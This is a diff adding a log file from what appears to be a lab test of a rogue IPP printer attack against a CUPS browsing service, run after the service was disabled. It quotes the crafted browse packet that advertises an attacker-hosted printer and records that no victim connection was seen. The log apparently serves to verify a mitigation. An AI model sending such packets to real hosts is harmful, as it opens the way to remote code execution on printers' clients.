@@ -1,0 +1,10 @@
+2026-10-28 12:16:45,338 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:16:46,339 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/AfterDisable "Lab" "Rogue Printer"\n'
+2026-10-28 12:16:47,391 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:16:57,411 INFO RESULT: no TCP connection from the victim seen
+2026-10-28 12:16:57,413 INFO saved 6 packets to pcap_files/09_after_disable_basic.pcap
+2026-10-28 12:17:05,713 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:17:06,716 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/AfterDisable "Lab" "Rogue Printer"\n'
+2026-10-28 12:17:07,759 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:17:17,771 INFO RESULT: no TCP connection from the victim seen
+2026-10-28 12:17:17,774 INFO saved 4 packets to pcap_files/09_after_disable_basic.pcap
